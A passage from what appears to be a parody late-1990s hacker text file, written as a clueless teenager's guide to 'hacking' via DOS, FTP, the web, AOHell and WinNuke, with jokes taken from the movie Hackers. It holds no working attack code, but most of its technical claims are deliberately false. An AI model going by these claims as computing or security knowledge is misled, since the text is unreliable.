+happened to me lots of times and he never even gives me a detention.
+
+  The best way to learn about hacking computers is to go to the dos prompt
+you can do this by clicking on the msdos icon on the windows programms group
+window in chooser.  In dos you can do lots of stuff like look at secret
+files, make programs (using batch or qbasic like gorilla or bananna wars or
+whatever) and learn about deep workings of the computer machine.
+
+  One thing i learned about in my computer class in school is a thing called
+ftp.  it lets you still files from other people computers.  you simply do
+like this:
+
+   ftp computerhack
+
+  and you can still ther files.  it is very easy but sometimes does not work
+if a firewall or antivirus is installed on the computer or if they are
+running newer versions of dos.
+
+  Anotherway to hack into computers is by using www.  www is a protocol that
+is also known as internet protocol, which is a way to look at web pages. 
+web pages are files on other peoples computers.  Basically you can hack
+these if you can get in and use various hacks like seeing passwords on the
+web page or post a message tricking another user to give you his information
+(known on aol as phishing).
+
+  The best way to hack a computer is to use aohell aohell is a program that
+lets you do things like hack other aol users connections and computers.  you
+sometimes need ip address but i will write more about how to get this ip
+address and what it is in another articel.  basically with aohell you can
+find users information and trick them and hack their computer to get their
+connection dropped (winnuke) or do other things that i am still lerning
+about.
+
+  well i can hear you say "so what i can hack aol now what do i care what if
+it is a different system well i know what you are talking about so i will
+cover more information about the different systems some of which are used by
+companies and some by other computer hackers.
+
+  sometimes a big company will use a system that is not windows or aol or
+even dos but is called database.  database is a system that can hold more
+information than aol or dos but is very expensive so it is used by companies
+and pirates.  pirates is a hacker term for stealing software not being on
+boats haha this is joke
+
+  database can be hacked in different ways depending on if it is unix or
+windows nt database but both types are very hard and only for expert hackers
+like cdej members i do not really understand database yet but i will lern :)
+
+  ok finally last note if your mom comes into your room when you are hacking
+just jump in bed and put your secret disk and cigarettes in the vent just
+like joey on the movie hackers it works every time!
+
+   so long for now!
+    hunt3r
+
+----x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*----
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ . . . . . . . . . . . .   FIN   . . . . . . . . . . . . . . . .
+  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+----x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*x*----
